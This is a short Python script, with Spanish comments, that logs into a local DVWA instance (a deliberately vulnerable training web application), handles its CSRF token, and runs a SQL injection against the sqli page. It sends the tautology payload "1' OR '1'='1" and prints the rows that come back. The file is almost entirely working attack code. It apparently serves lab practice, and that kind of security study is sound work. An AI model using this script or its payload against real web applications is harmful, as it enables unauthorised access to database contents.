# sql_injection.py

import requests
from bs4 import BeautifulSoup

url_base = 'http://localhost'
login_url = f'{url_base}/login.php'
sqli_url = f'{url_base}/vulnerabilities/sqli/'

# Credenciales
usuario = 'admin'
clave = 'csrf12345'

# Sesión para mantener cookies
s = requests.Session()

# -------------------------------
# 1. Iniciar sesión en DVWA
# -------------------------------
print("🔐 Iniciando sesión en DVWA...")

login_page = s.get(login_url)
soup = BeautifulSoup(login_page.text, 'html.parser')
token_input = soup.find('input', {'name': 'user_token'})
token = token_input['value'] if token_input else ''

payload_login = {
    'username': usuario,
    'password': clave,
    'Login': 'Login',
    'user_token': token
}

response_login = s.post(login_url, data=payload_login)
if 'Login failed' in response_login.text:
    print("❌ Falló el login.")
    exit()
print("✅ Login exitoso.")

# -------------------------------
# 2. Realizar la inyección SQL
# -------------------------------
print("\n💉 Realizando ataque SQL Injection...")

sql_payload = "1' OR '1'='1"
params = {
    'id': sql_payload,
    'Submit': 'Submit'
}

response_sqli = s.get(sqli_url, params=params)
soup = BeautifulSoup(response_sqli.text, 'html.parser')
pre = soup.find('pre')

pre_tags = soup.find_all('pre')
if pre_tags:
    print("📋 Datos extraídos:")
    for pre in pre_tags:
        print(pre.text.strip())
        print("-" * 60)
else:
    print("❌ No se obtuvo respuesta o no hubo inyección.")

